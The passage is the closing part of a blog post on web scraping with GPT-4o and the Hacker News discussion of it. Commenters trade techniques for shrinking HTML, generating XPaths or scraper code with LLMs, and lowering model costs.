be able to justify a higher budget for these experiments!). Some stuff I’d like to try if I had more time: Capture browser events: the current demo is a one-off process: users enter the URL and an initial XPath. This isn’t great UX as it’d be better to ask the user to click on the table they want to extract, and to provide some sample rows so the model can understand the structure a bit better. In complex tables, a single XPath might not be enough to extract a full column, I’d like to see if asking the LLM to return a program (e.g. Python) would work. More experimenting with the HTML clean up is needed. It’s very expensive to use GPT-4o and I feel like I’m passing a lot of unnecessary data to the model Updated: August 28, 2024 Share on Twitter Facebook Google+ LinkedIn",
    "commentLink": "https://news.ycombinator.com/item?id=41428274",
    "commentBody": "Web scraping with GPT-4o: powerful but expensive (blancas.io)328 points by edublancas 23 hours agohidepastfavorite155 comments jumploops 19 hours agoWe've had the best success by first converting the HTML to a simpler format (i.e. markdown) before passing it to the LLM. There are a few ways to do this that we've tried, namely Extractus[0] and dom-to-semantic-markdown[1]. Internally we use Apify[2] and Firecrawl[3] for Magic Loops[4] that run in the cloud, both of which have options for simplifying pages built-in, but for our Chrome Extension we use dom-to-semantic-markdown. Similar to the article, we're currently exploring a user-assisted flow to generate XPaths for a given site, which we can then use to extract specific elements before hitting the LLM. By simplifying the \"problem\" we've had decent success, even with GPT-4o mini. [0] https://github.com/extractus [1] https://github.com/romansky/dom-to-semantic-markdown [2] https://apify.com/ [3] https://www.firecrawl.dev/ [4] https://magicloops.dev/ reply pkiv 15 hours agoparentIf you're open to it, I'd love to hear what you think of what we're building at https://browserbase.com/ - you can run a chrome extension on a headless browser so you can do the semantic markdown within the browser, before pulling anything off. We even have an iFrame-able live view of the browser, so your users can get real-time feedback on the XPaths they're generating: https://docs.browserbase.com/features/session-live-view#give... Happy to answer any questions! reply jumploops 13 hours agorootparentThis is super neat and I think I've seen your site before :) Do you handle authentication? We have lots of users that want to automate some part of their daily workflow but the pages are often behind a login and/or require a few clicks to reach the desired content. Happy to chat: username@gmail.com reply peab 3 hours agorootparentI'm also curious about this! I've been learning about scraping, but I've had a hard time finding good info about how to deal with user auth effectively. reply retrofuturism 10 hours agorootparentprevYou must get a lot of test emails to that FANTASTIC gmail address. Funny how it might even be worth some decent money. reply spyder 7 hours agorootparentThat's not literally his e-mail :D. He means that you have to replace it with his HN username. It would have been better to write it like this: [HN username]@gmail.com reply retrofuturism 4 hours agorootparentHahaha okay I feel dumb now. reply delfinom 6 hours agorootparentprevPersonally I thought it was a LLM reply to a LLM marketing post to fake engagement. Lol reply naiv 12 hours agorootparentprevAwesome product! I was just a bit confused that the sign up buttons for the Hobby and Scale plans are grey, I thought that they are disabled until randomly hovering over them. reply sunshadow 13 hours agorootparentprevI don't see any difference than browserless? reply pkiv 13 hours agorootparentThe price and the dashboard are a great start :) reply emilburzo 12 hours agorootparentprevRomania is missing from the list of phone number countries on signup, not sure if on purpose or not. reply mistercow 3 hours agoparentprevHave you compared markdown to just stripping the HTML down (strip tag attributes, unwrap links, remove obvious non-displaying elements)? My experience has been that performance is pretty similar to markdown, and it’s an easier transformation with fewer edge cases. reply nickpsecurity 3 hours agorootparentThat’s what I’ve done for quite a few [non-LLM] applications. The remaining problem is that HTML is verbose vs other formats. That has a higher, per-token cost. So, maybe stripping followed by substituting HTML tags with a compressed notation. reply defgeneric 1 hour agorootparentI've tried this and found it doesn't make much difference. The idea was to somehow preserve the document structure while reducing the token count, so you do things like strip all styles, etc. until you have something like a structure of divs, then reduce that. But I found no performance gain in terms of output. It seems whatever structure of the document is left over after doing the reduction has little semantic meaning that can't be conveyed by spaces or newlines. Even when using something like html2markdown, it doesn't perform much better. So in a sense the LLM is \"too good\", and all you really need to worry about is reducing the token count. reply a_wild_dandan 45 minutes agorootparentI wonder if using nested markdown bullet points would help. You would preserve the information hierarchy, and LLMs are phenomenal with (and often output) markdown. reply mistercow 2 hours agorootparentprevYeah it’s slightly more token heavy, although not as much as it seems like at first glance. Most opening tags are 2-3 tokens, and most closing tags are 3-4. Since tags are generally a pretty small fraction of the text, it typically doesn’t make a huge difference IME, but it obviously depends on the particular content. reply snthpy 13 hours agoparentprevThank you for these. I've been wanting to try the same approach and have been looking for the right tools. reply neeleshs 15 hours agoparentprevWe did something similar -na although in a somewhat different context. Translating a complex JSON representing an execution graph to a simpler graphviz dot format first and then feeding it to an LLM. We had decent success. reply jumploops 13 hours agorootparentYes, just like with humans, if you simplify the context, it's often much easier to get the desired result. Source: I have a toddler at home. reply pbronez 7 hours agoparentprevFirst I’ve heard of Semantic Markdown [0]. It appears to be a way to embed RDF data in Markdown documents. The page I found is labeled “Alpha Draft,” which suggests there isn’t a huge corpus of Semantic Markdown content out there. This might impede LLM’s ability to understand it due to lack of training data. However, it seems sufficiently readable that LLMs could get by pretty well by treating its structured metadata as parathenicals ===== What is Semantic Markdown? Semantic Markdown is a plain-text format for writing documents that embed machine-readable data. The documents are easy to author and both human and machine-readable, so that the structured data contained within these documents is available to tools and applications. Technically speaking, Semantic Markdown is \"RDFa Lite for Markdown\" and aims at enhancing the HTML generated from Markdown with RDFa Lite attributes. Design Rationale: Embed RDFa-like semantic annotation within Markdown Ability to mix unstructured human-text with machine-readable data in JSON-LD-like lists Ability to semantically annotate an existing plain Markdown document with semantic annotations Keep human-readability to a maximum About this document ===== [0] https://hackmd.io/@sparna/semantic-markdown-draft reply namukang 10 hours agoprevFor structured content (e.g. lists of items, simple tables), you really don’t need LLMs. I recently built a web scraper to automatically work on any website [0] and built the initial version using AI, but I found that using heuristics based on element attributes and positioning ended up being faster, cheaper, and more accurate (no hallucinations!). For most websites, the non-AI approach works incredibly well so I’d make sure AI is really necessary (e.g. data is unstructured, need to derive or format the output based on the page data) before incorporating it. [0] https://easyscraper.com reply sebstefan 7 hours agoparentThe LLM is resistant to website updates that would break normal scraping If you do like the author did and ask it to generate xPaths, you can use it once, use the xPaths it generated for regular scraping, then once it breaks fall back to the LLM to update the xPaths and fall back one more time to alerting a human if the data doesn't start flowing again, or if something breaks further down the pipeline because the data is in an unexpected format. reply is_true 6 hours agorootparentXpath can be based on content, not only positions reply melenaboija 6 hours agorootparentprevUnless the update is splitting cells. > Turns out, a simple table from Wikipedia (Human development index) breaks the model because rows with repeated values are merged reply sebstefan 5 hours agorootparentNah, still correct :-) that would break the regular scraping as well >The LLM is resistant to website updates that would break normal scraping reply poulpy123 6 hours agoparentprevyours is the first one see that allows to scrape by selecting directly what to scrape. I always wondered why there was no tool doing that. reply sebstefan 4 hours agorootparentI've seen another website like this that had this feature on hackernews but it was from a retrospective. These websites have the nasty habit of ceasing operations reply echelon 1 hour agorootparentIt needs to be a library. reply tom1337 20 hours agoprevOpenAI recently announced a Batch API [1] which allows you to prepare all prompts and then run them as a batch. This reduces costs as its just 50% the price. Used it a lot with GPT-4o mini in the past and was able to prompt 3000 Items in less than 5min. Could be great for non-realtime applications. [1] https://platform.openai.com/docs/guides/batch reply Tostino 19 hours agoparentI hope some of the opensource inference servers start supporting that endpoint soon. I know vLLM has added some \"offline batch mode\" support with the same format, they just haven't gotten around to implementing it on the OpenAI endpoint yet. reply asaddhamani 15 hours agorootparentDo note it can take up to 24 hours or drop requests altogether. But if that’s not an issue for your use case it’s a great cost saving. reply altdataseller 9 hours agorootparentWhat percentage of requests usually get dropped? Is it something miniscule like 1% or are we talking non trivial like 10% reply jumploops 15 hours agorootparentprevThis is neat, I’ve been looking for a way to run our analytics (LLM-based) without affecting the rate limits of our prod app. May need to give this a try! reply johndough 11 hours agorootparentprevllama.cpp enabled continuous batching by default half a year ago: https://github.com/ggerganov/llama.cpp/pull/6231 There is no need for a new API endpoint. Just send multiple requests at once. reply Tostino 11 hours agorootparentThe point of the endpoint is to be able to standardize my codebase and have an agnostic LLM provider that works the same. Continuous batching is helpful for this type of thing, but it really isn't everything you need. You'd ideally maintain a low priority queue for the batch endpoint and a high priority queue for your real-time chat/completions endpoint. Would allow utilizing your hardware much better. reply LunaSea 11 hours agoparentprevThat's a great proposition by OpenAI. I think however that it is still one to two orders of magnitude too expensive compared to traditional text extraction with very similar precision and recall levels. reply cdrini 6 hours agoparentprevYeah this was a phenomenal decision on their part. I wish some of the other cloud tools like azure would offer the same thing, it just makes so much sense! reply antirez 8 hours agoprevIt's very surprising that the author of this post does 99% of the work and writing and then does not go forward for the other 1% downloading ollama (or some other llama.cpp based engine) and testing how some decent local LLM works in this use case. Because maybe a 7B or 30B model will do great in this use case, and that's cheap enough to run: no GPT-4o needed. reply devoutsalsa 1 hour agoparentNot OP, but thanks for the suggestion. I’m starting to play around with LLMs and will explore locally hosted versions. reply parhamn 19 hours agoprevIs there a \"html reducer\" out there? I've been considering writing one. If you take a page's source it's going to be 90% garbage tokens -- random JS, ads, unnecessary properties, aggressive nesting for layout rendering, etc. I feel like if you used a dom parser to walk and only keep nodes with text, the html structure and the necessary tag properties (class/id only maybe?) you'd have significant savings. Perhaps the xpath thing might work better too. You can even even drop necessary symbols and represent it as a indented text file. We use readability for things like this but you lose the dom structure and their quality reduces with JS heavy websites and pages with actions like \"continue reading\" which expand the text. Whats the gold standard for something like this? reply axg11 19 hours agoparentI wrote an in-house one for Ribbon. If there’s interest, will open source this. It’s amazing how much better our LLM outputs are with the reducer. reply CalRobert 1 hour agorootparentAdd my voice to the chorus asking for this! reply parhamn 19 hours agorootparentprevYes! Happy to try it on a fairly large user base and contribute to it! Email in bio if you want a beta user. reply yadaeno 3 hours agorootparentprev+1 reply chrisrickard 4 hours agorootparentprev100% reply faefox 4 hours agorootparentprev+1 reply ushtaritk421 11 hours agorootparentprevI would be very interested in this. reply Tostino 19 hours agorootparentprevI'm absolutely interested in this. reply kurthr 19 hours agorootparentprevThat would be wonderful. reply guwop 7 hours agorootparentprevsounds amazing! reply 7thpower 16 hours agorootparentprevYes please reply downWidOutaFite 18 hours agorootparentprev+1 reply simonw 19 hours agoparentprevJina.ai offer a really neat (currently free) API for this - you add https://r.jina.ai/ on the beginning of any API and it gives you back a Markdown version of the main content of that page, suitable for piping into an LLM. Here's an example: https://r.jina.ai/https://simonwillison.net/2024/Sep/2/anato... - for this page: https://simonwillison.net/2024/Sep/2/anatomy-of-a-textual-us... Their code is open source so you can run your own copy if you like: https://github.com/jina-ai/reader - it's written in TypeScript and uses Puppeteer and https://github.com/mozilla/readability I've been using Readability (minus the Markdown) bit myself to extract the title and main content from a page - I have a recipe for running it via Playwright using my shot-scraper tool here: https://shot-scraper.datasette.io/en/stable/javascript.html#... shot-scraper javascript https://simonwillison.net/2024/Sep/2/anatomy-of-a-textual-user-interface/ \" async () => { const readability = await import('https://cdn.skypack.dev/@mozilla/readability'); return (new readability.Readability(document)).parse(); }\" reply BeetleB 3 hours agorootparent+1 for this. I too use Readability via Simon's shot-scraper tool. reply suchintan 14 hours agoparentprevWe wrote something like this to power Skyvern: https://github.com/Skyvern-AI/skyvern/blob/0d39e62df6c516e0a... It's adapted from vimium and works like a charm. Distill the html down to it's important bits, and handle a ton of edge cases along the way haha reply ErikAugust 19 hours agoparentprevRunning it through Readability: https://github.com/mozilla/readability reply parhamn 19 hours agorootparentI snuck in an edit about readability before I saw your reply. The quality of that one in particular is very meh, especially for most new sites and then you lose all of the dom structure in case you want to do more with the page. Though now I'm curious how it works on the weather.com page the author tried. pupeteer -> screenshot -> ocr (or even multi-modal which many do OCR first) -> LLM pipeline might work better there. reply LunaSea 11 hours agorootparentIssue is that Llama are x100 more expensive at the very least. reply edublancas 19 hours agoparentprevauthor here: I'm working on a follow-up post. Turns out, removing all HTML tags works great and reduces the cost by a huge margin. reply AbstractH24 7 hours agorootparentAm I crazy or is there no way to “subscribe” to your site? Interested to follow your learnings in this area. reply edublancas 27 minutes agorootparentthere isn't. but you can connect X or LinkedIn. I might add a subscribe button once I get some time :) reply 7thpower 16 hours agorootparentprevWhat do you mean? What do you use as reference points? reply edublancas 15 hours agorootparentnothing, I strip out all the HTML tags and pass raw text reply isaacfung 15 hours agorootparentHow do you keep table structure? reply jaimehrubiks 9 hours agorootparentThey should probably keep tables and lists and strip most of the rest. reply lelandfe 19 hours agoparentprevOnly works insofar as sites are being nice. A lot of sites do things like: render all text via JS, render article text via API, paywall content by showing a preview snippet of static text before swapping it for the full text (which lives in a different element), lazyload images, lazyload text, etc etc. DOM parsing wasn't enough for Google's SEO algo, either. I'll even see Safari's \"reader mode\" fail utterly on site after site for some of these reasons. I tend to have to scroll the entire page before running it. reply zexodus 11 hours agorootparentIt's possible to capture the DOM by running a headless browser (i.e. with chromedriver/geckodriver), allowing the js execute and then saving the HTML. If these readers do not use already rendered HTML to parse the information on the screen, then... reply lelandfe 5 hours agorootparentIndeed, Safari's reader already upgrades to using the rendered page, but even it fails on more esoteric pages using e.g. lazy loaded content (i.e. you haven't scrolled to it yet for it to load); or (god forbid) virtualized scrolling pages, which offloads content out of view. It's a big web out there, there's even more heinous stuff. Even identifying what the main content is can be a challenge. And reader mode has the benefit of being ran by the user. Identifying when to run a page-simplifying action on some headlessly loaded URL can be tricky. I imagine it would need to be like: load URL, await load event, scroll to bottom of page, wait for the network to be idle (and possibly for long tasks/animations to finish, too) reply purple-leafy 17 hours agoparentprevI wrote one for a project that captures a portion of the DOM and sends it to an LLM. It’s strips all JS/event handlers, most attributes and most CSS, and only keeps important text nodes I needed this because I was using LLM to reimplement portions of a page using just tailwind, so needed to minimise input tokens reply nickpsecurity 3 hours agoparentprevThat’s easy to do with BeautifulSoup in Python. Look up tutorials on that. Use it on non-essential tags. That will at least work when the content is in HTML rather than procedurally generated (eg JavaScript). reply btbuildem 6 hours agoprevI've had good luck with giving it an example of HTML I want scraped and asking for a beautifulsoup code snippet. Generally the structure of what you want to scrape remains the same, and it's a tedious exercise coming up with the garbled string of nonsense that ends up parsing it. Using an LLM for the actual parsing, that's simultaneously overkill while risking your results being polluted with hallucinations. reply hubraumhugo 14 hours agoprevWe've been working on AI-automated web scraping at Kadoa[0] and our early experiments were similar to the those in the article. We started when only the expensive and slow GPT-3 was available, which pushed us to develop a cost-effective solution at scale. Here is what we ended up with: - Extraction: We use codegen to generate CSS selectors or XPath extraction code. This is more efficient than using LLMs for every data extraction. Using an LLM for every data extraction, would be expensive and slow, but using LLMs to generate the scraper code and subsequently adapt it to website modifications is highly efficient. - Cleansing & transformation: We use small fine-tuned LLMs to clean and map data into the desired format. - Validation: Unstructured data is a pain to validate. Among traditional data validation methods like reverse search, we use LLM-as-a-judge to evaluate the data quality. We quickly realized that doing this for a few data sources with low complexity is one thing, doing it for thousands of websites in a reliable, scalable, and cost-efficient way is a whole different beast. Combining traditional ETL engineering methods with small, well-evaluated LLM steps was the way to go for us [0] https://kadoa.com reply artembugara 10 hours agoparentthis! I've been following Kadoa since its very first days. Great team. reply danielvaughn 1 hour agoprevThe author claims that attempting to retrieve xpaths with the LLM proved to be unreliable. I've been curious about this approach because it seems like the best \"bang for your buck\" with regards to cost. I bet if you experimented more, you could probably improve your results. reply artembugara 9 hours agoprevWow, that's one of the most orange tag-rich posts I've ever seen. We're doing a lot of tests with GPT-4o at NewsCatcher. We have to crawl 100k+ news websites and then parse news content. Our rule-based model for extracting data from any article works pretty well, and we never could find a way to improve it with GPT. \"Crawling\" is much more interesting. We need to know all the places where news articles can be published: sometimes 50+ sub-sections. Interesting hack: I think many projects (including us) can get away with generating the code for extraction since the per-website structure rarely changes. So, we're looking for LLM to generate a code to parse HTML. Happy to chat/share our findings if anyone is interested: artem [at] newscatcherapi.com reply AbstractH24 7 hours agoparentI’d love to look into this for a hobbyist project I’m working on. Wish you had self signup! reply zulko 8 hours agoprevSame experience here. Been building a classical music database [1] where historical and composer life events are scraped off wikipedia by asking ChatGPT to extract lists of `[{event, year, location}, ...]` from biographies. - Using chatgpt-mini was the only cheap option, worked well (although I have a feeling it's dumbing down these days) and made it virtually free. - Just extracting the webpage text from HTML, with `BeautifulSoup(html).text` slashes the number of tokens (but can be risky when dealing with complex tables) - At some point I needed to scrape ~10,000 pages that have the same format and it was much more efficient speed-wise and price-wise to provide ChatGPT with the HTML once and say \"write some python code that extracts data\", then apply that code to the 10,000 pages. I'm thinking a very smart GPT-based web parser could do that, with dynamically generated scraping methods. - Finally because this article mentions tables, Pandas has a very nice feature `from_html(\"http:/the-website.com\")` that will detect and parse all tables on a page. But the article does a good job pointing at websites where the method would fail because the tables don't use `` [1] https://github.com/Zulko/composer-timelines reply davidsojevic 7 hours agoparentIf you haven't considered it, you can also use the direct wikitext markup, from which the HTML is derived. Depending on how you use it, the wikitext may or may not be more ingestible if you're passing it through to an LLM anyway. You may also be able to pare it down a bit by heading/section so that you can reduce it do only sections that are likely to be relevant (eg. \"Life and career\") type sections. You can also download full dumps [0] from Wikipedia and query them via SQL to make your life easier if you're processing them. [0] https://en.wikipedia.org/wiki/Wikipedia:Database_download#Wh...? reply zulko 7 hours agorootparent> reduce it do only sections that are likely to be relevant (eg. \"Life and career\") True but I also managed to do this from HTML. I tried getting pages wikitext through the API but couldn't find how to. Just querying the HTML page was less friction and fast enough that I didn't need a dump (although when AI becomes cheap enough, there is probably a lot of things to do from a wikipedia dump!). One advantage of using online wikipedia instead of a dump is that I have a pipeline on Github Actions where I just enter a composer name and it automagically scrapes the web and adds the composer to the database (takes exactly one minute from the click of the button!). reply distances 5 hours agorootparentWikipedia's api.php supports JSON output, which probably helps already quite a bit. For example https://en.wikipedia.org/w/api.php?action=query&prop=extract... reply abhgh 11 hours agoprevAs others have mentioned here you might get better results cheaper (this probably wasn't the point of the article, so just fyi) if you preprocess the html first. I personally have had good results with trafilatura[1], which I don't see mentioned yet. [1] https://trafilatura.readthedocs.io/en/latest/ reply jeanloolz 7 hours agoparentI second trafilatura greatly. This will save a huge amount of money to just send the text to the LLM. I used it on this recent project (shameless plug): https://github.com/philippe2803/contentmap. It's a simple python library that creates a vector store for any website, using a domain XML sitemap as a starting point. The challenge was that each domain has its own HTML structure, and to create a vector store, we need the actual content, removing HTML tags, etc. Trafilatura basically does that for any url, in just a few lines of code. reply abhgh 5 hours agorootparentGood to know! Yes, trafilatura is great, sure it breaks sometimes, but everything breaks on some website - the real questions are how often and what is the extent of breakage. For general info., the library was published about here [1], where in Table 1 they provide some benchmarks. I also forgot to mention another interesting scraper that's an LLM based service. A quick search here tells me it was mentioned once by simonw, but I think it should be better known just for the convenience! Prepend \"r.jina.ai\" to any URL to extract text. For ex., check out [2] or [3]. [1] https://aclanthology.org/2021.acl-demo.15.pdf [2] https://r.jina.ai/news.ycombinator.com/ [3] (this discussion) https://r.jina.ai/news.ycombinator.com/item?id=41428274 reply tuktuktuk 13 hours agoprevCan you share how long it took for you to parse the HTML? I recently experimented with comparing different AI models, including GPT-4o, alongside Gemini and Claude to parse raw HTML: https://serpapi.com/blog/web-scraping-with-ai-parsing-html-t.... Result is pretty interesting. reply jasonthorsness 19 hours agoprevI also had good results with structured outputs, scraping news articles for city names from https://lite.cnn.com for the “in the news” list at https://weather.bingo - code here: https://www.jasonthorsness.com/13 I’ve had problems with hallucinations though even for something as simple as city names; also the model often ignores my prompt and returns country names - am thinking of trying a two-stage scrape with one checking the output of the other. reply kcorbitt 20 hours agoprevFunnily enough, web scraping was actually the motivating use-case that started my co-founder and I building what is now openpipe.ai. GPT-4 is really good at it, but extremely expensive. But it's actually pretty easy to distill its skill at scraping a specific class of site down to a fine-tuned model that's way cheaper and also really good at scraping that class of site reliably. reply artembugara 10 hours agoparentWow, Kyle, you should have mentioned it earlier! We've been working on this for quite a while. I'll contact you to show how far we've gotten reply marcell 19 hours agoprevI'm working on a Chrome extension to do web scraping using OpenAI, and I've been impressed by what ChatGPT can do. It can scrape complicated text/html, and usually returns the correct results. It's very early still but check it out at https://FetchFoxAI.com One of the cool things is that you can scrape non-uniform pages easily. For example I helped someone scrape auto dealer leads from different websites: https://youtu.be/QlWX83uHgHs . This would be a lot harder with a \"traditional\" scraper. reply hydrogenpolo 19 hours agoparentCool, would this work on something like instagram? Scraping pages? reply marcell 19 hours agorootparentYes! I actually just had someone else ask about Instagram. Try it out :) I got these results just now: https://fetchfoxai.com/s/UOqL5HtuNe If you want to do the same scrape, here is the prompt I used: https://imgur.com/XhguCk4 reply dghlsakjg 19 hours agorootparentprevInstagram really doesn’t want you scraping. There are almost certainly terms against it in the user agreement reply bangaladore 19 hours agorootparentCompanies like Instagram (Facebook/Meta/Garbage) abuse their users' data day in and day out. Who cares what their TOS says. Let them spend millions of dollars trying to block you, its a drop in the bucket. reply houseplant 14 hours agorootparentinstead, don't do it because it's disrespectful to people. A lot of people weren't made aware- or didn't have the option- to object to that TOS change. Saying \"well, THOSE guys do it! why can't I!\" isn't a mature stance. Don't take their images because it's the right thing to do reply bilater 2 hours agoprevNot sure why author didn't use 4o-mini. 4o for reasoning but things like parsing/summarizing can be done by cheaper models with little loss in quality. reply mthoms 2 hours agoparent> Note: I also tried GPT-4o mini but yielded significantly worse results so I just continued my experiments with GPT-4o. reply mmasu 4 hours agoprevAs a poc, we first took a screenshot of the page, cropped it to the part we needed and then passed it to GPT. One of the things we do is compare prices of different suppliers for the same product (i.e. airline tickets), and sometimes need to do it manually. While the approach could look expensive, it is in general cheaper than a real person, and enables the real person to do more meaningful work… so it’s a win-win. I am looking forward to put this in production hopefully reply godber 4 hours agoprevI would definitely approach this problem by having the LLM write code to scrape the page. That would address the cost and accuracy problems. And also give you testable code. reply ammario 20 hours agoprevTo scale such an approach you could have the LLM generate JS to walk the DOM and extract content, caching the JS for each page. reply kanzure 4 hours agoprevInstead of directly scraping with GPT-4o, what you could do is have GPT-4o write a script for a simple web scraper and then use a prompt-loop when something breaks or goes wrong. I have the same opinion about a man and his animals crossing a river on a boat. Instead of spending tokens on trying to solve a word problem, have it create a constraint solver and then run that. Same thing. reply simonw 19 hours agoprevGPT-4o mini is 33x cheaper than GPT-4o, or 66x cheaper in batch mode. But the article says: > I also tried GPT-4o mini but yielded significantly worse results so I just continued my experiments with GPT-4o. Would be interesting to compare with the other inexpensive top tier models, Claude 3 Haiku and Gemini 1.5 Flash. reply edublancas 19 hours agoparentauthor here: I'm working on a follow-up post where I benchmark pre-processing techniques (to reduce the token count). Turns out, removing all HTML works well (much cheaper and doesn't impact accuracy). So far, I've only tried gpt-4o and the mini version, but trying other models would be interesting! reply sentinels 5 hours agoprevWhat people mentioned above is pretty much what they did at octabear and as an extension of the idea it's also what a lot of startups applicants did for other type of media like video scraping, podcast scraping, audio scraping, etc [0] https://www.octabear.com/ reply mfrye0 14 hours agoprevAs others have mentioned, converting html to markdown works pretty well. With that said, we've noticed that for some sites that have nested lists or tables, we get better results by reducing those elements to a simplified html instead of markdown. Essentially providing context when the structures start and stop. It's also been helpful for chunking docs, to ensure that lists / tables aren't broken apart in different chunks. reply the_cat_kittles 3 hours agoprevis it really so hard to look at a couple xpaths in chrome? insane that people actually use an llm when trying to do this for real. were headed where automakers are now- just put in idiot lights, no one knows how to work on any parts anymore. suit yourself i guess reply mateuszbuda 7 hours agoprevI think that LLM costs, even GPT-4o, are probably lower compared to proxy costs usually required for web scraping at scale. The cost of residential/mobile proxies is a few $ per GB. If I were to process cleaned data obtained using 1GB of residential/mobile proxy transfer, I wouldn't pay more for LLM. reply ozr 14 hours agoprevGPT-4 (and Claude) are definitely the top models out there, but: Llama, even the 8b, is more than capable of handling extraction like this. I've pumped absurd batches through it via vLLM. With serverless GPUs, the cost has been basically nothing. reply shoelessone 10 hours agoparentCan you explain a bit more about what \"serverless GPUs\" are exactly? Is there a specific cloud provider you're thinking of, e.g. is there a GPU product with AWS? Google gives me SageMaker, which is perhaps what you are referring to? reply agcat 57 minutes agorootparentYou can check out this technical deep dive on Serverless GPUs offerings/Pay-as-you-go way. This includes benchmarks around cold-starts, performance consistency, scalability, and cost-effectiveness for models like Llama2 7Bn & Stable Diffusion across different providers -https://www.inferless.com/learn/the-state-of-serverless-gpus... .Can save months of your time. Do give it a read. P.S: I am from Inferless. reply ozr 4 hours agorootparentprevThere are a few companies out there that provide it, Runpod and Replicate being the two that I've used. If you've ever used AWS Lambda (or any other FaaS) it's essentially the same thing. You ship your code as a container within a library they provide that allows them to execute it, and then you're billed per-second for execution time. Like most FaaS, if your load is steady-state it's more expensive than just spinning up a GPU instance. If your use-case is more on-demand, with a lot of peaks and troughs, it's dramatically cheaper. Particularly if your trough frequently goes to zero. Think small-scale chatbots and the like. Runpod, for example, would cost $3.29/hr or ~$2400/mo for a single H100. I can use their serverless offering instead for $0.00155/second. I get the same H100 performance, but it's not sitting around idle (read: costing me money) all the time. reply luigi23 20 hours agoprevWhy are scrapers so popular nowadays? reply adamtaylor_13 19 hours agoparentThere’s a lot of data that we should have programmatic access to that we don’t. The fact that I can’t get my own receipt data from online retailers is unacceptable. I built a CLI Puppeteer scraper to scrape sites like Target, Amazon, Walmart, and Kroger for precisely this reason. Any website that has my data and doesn’t give me access to it is a great target for scraping. reply drusepth 20 hours agoparentprevI'd say scrapers have always been popular, but I imagine they're even more popular nowadays with all the tools (AI but also non-AI) readily available to do cool stuff on a lot of data. reply bongodongobob 20 hours agorootparentBingo. During the pandemic, I started a project to keep myself busy by trying to scrape stock market ticker data and then do some analysis and make some pretty graphs out of it. I know there are paid services for this, but I wanted to pull it from various websites for free. It took me a couple months to get it right. There are so many corner cases to deal with if the pages aren't exactly the same each time you load them. Now with the help of AI, you can slap together a scraping program in a couple of hours. reply MaxPock 20 hours agorootparentWas it profitable? reply keyle 19 hours agorootparentI'm sure it was profitable in keeping him busy during the pandemic. Not everything has to derive monetary value, you can do something for experience, fun, kick the tyres, open-source and/or philanthropic avenues. Besides it's a low margin, heavily capitalized and heavily crowded market you'd be entering and not worth the negative-monetary investment in the short and medium term (unless you wrote AI in the title and we're going to the mooooooon babyh) reply bongodongobob 14 hours agorootparentprevIt was in the sense that I learned that trying to beat the market is fundamentally impossible/stupid, so just invest in index funds. reply rietta 20 hours agoparentprevBecause publishers don’t push structured data or APIs enough to satisfy demand for the data. reply luigi23 20 hours agorootparentGot it, but why is it booming now and often it’s a showcase of llm model? Is there some secret market/ usecase for it? reply IanCal 20 hours agorootparentBuilding scrapers sucks. It's generally not hard because it's conceptually very difficult, or that it requires extremely high level reasoning. It sucks because when someone changes \"\" to \"\" your scraper breaks. I just want the bio and it's obvious what to grab, but machines have no nuance. LLMs have enough common sense to be able to deal with these things and they take almost no time to work with. I can throw html at something, with a vague description and pull out structured data with no engineer required, and it'll probably work when the page changes. There's a huge number of one-off jobs people will do where perfect isn't the goal, and a fast solution + a bit of cleanup is hugely beneficial. reply atomic128 19 hours agorootparentAnother approach is to use a regexp scraper. These are very \"loose\" and tolerant of changes. For example, RNSAFFN.com uses regular expressions to scrape the Commitments of Traders report from the Commodity Futures Trading Commission every week. reply simonw 19 hours agorootparentMy experience has been the opposite: regex scrapers are usually incredibly brittle, and also harder to debug when something DOES change. My preferred approach for scraping these days is Playwright Python and CSS selectors to select things from the DOM. Still prone to breakage, but reasonably pleasant to debug using browser DevTools. reply yuters 16 hours agorootparentprevI don't know if many has the same use case but... I'm heavily relying on this right now because my daughter started school. The school board, the school, and the teacher each use a different app to communicate important information to parents. I'm just trying to make one feed with all of them. Before AI it would have been hell to scrape, because you can imagine those apps are terrible. Fun aside: The worst one of them is a public Facebook page. The school board is making it their official communication channel, which I find horrible. Facebook is making it so hard to scrape. And if you don't know, you can't even use Facebook's API for this anymore, unless you have a business verified account and go through a review just for this permission. reply drusepth 20 hours agorootparentprevScrapers have always been notoriously brittle and prone to breaking completely when pages make even the smallest of structural changes. Scraping with LLMs bypasses that pitfall because it's more of a summarization task on the whole document, rather than working specifically on a hard-coded document structure to extract specific data. reply bobajeff 20 hours agorootparentprevPersonally I find it's better for archiving as most sites that don't provide a convenient way to save their content directly. Occasionally, I do it just to make a better interface over the data. reply CSMastermind 12 hours agoparentprevThere's been a large push to do server-side rendering for web pages which means that companies no longer have a publicly facing API to fetch the data they display on their websites. Parsing the rendered HTML is the only way to extract the data you need. reply kordlessagain 4 hours agorootparentI've had good success running Playwright screenshots through EasyOCR, so parsing the DOM isn't the only way to do it. Granted, tables end up pretty messy... reply fzysingularity 2 hours agorootparentWe've been doing something simliar for VLM Run [1]. A lot of websites that have obfuscated HTML / JS or rendered charts / tables tend to be hard to parse with the DOM. Taking screenshots are definitely more reliable and future-proof as these webpages are built for humans to interact with. That said, the costs can be high as the OP says, but we're building cheaper and more specialized models for web screenshot -> JSON parsing. Also, it turns out you can do a lot more than just web-scraping [2]. [1] https://vlm.run [2] https://docs.vlm.run/introduction reply nsonha 15 hours agoparentprevWhat do you think all these LLM stuff will evolve into? Of course it's moving on from chitchat on stale information and now onto \"automate the web\" kinda phase, like it or not. reply timsuchanek 12 hours agoprevThis is also how we started a while ago. I agree that it's too expensive, hence we're working on making this scalable and cheaper now! We'll soon launch, but here we go! https://expand.ai reply hmottestad 10 hours agoparentI’m curious to know more about your product. Currently, I’m using visualping.io to keep an eye on the website of my local housing community. They share important updates there, and it’s really helpful for me to get an email every few months instead of having to check their site every day. reply mjrbds 16 hours agoprevWe've had lots of success with this at Rastro.sh - but the biggest unlock came when we used this as benchmark data to build scraping code. Sonnet 3.5 is able to do this. It reduced our cost and improved accuracy for our use case (extracting e-commerce products), as some of these models are not reliable to extract lists of 50+ items. reply fvdessen 19 hours agoprevThis looks super useful, but from what i've heard, if you try to do this at any meaningful scale your scrapers will be blocked by Cloudflare and the likes reply danpalmer 15 hours agoparentI used to do a lot of web scraping. Cloudflare is an issue, as are a few Cloudflare competitors, but scraping can still be useful. We had contracts with companies we scraped that allowed us to scrape their sites, specifically so that they didn't need to do any integration work to partner with us. The most anyone had to do on the company side was allowlist us with Cloudflare. Would recommend web scraping as a \"growth hack\" in that way, we got a lot of partnerships that we wouldn't otherwise have got. reply Havoc 19 hours agoprevAsking for XPaths is clever! Plus you can probably use that until it fails (website changes) and then just re scrape it with llm request reply 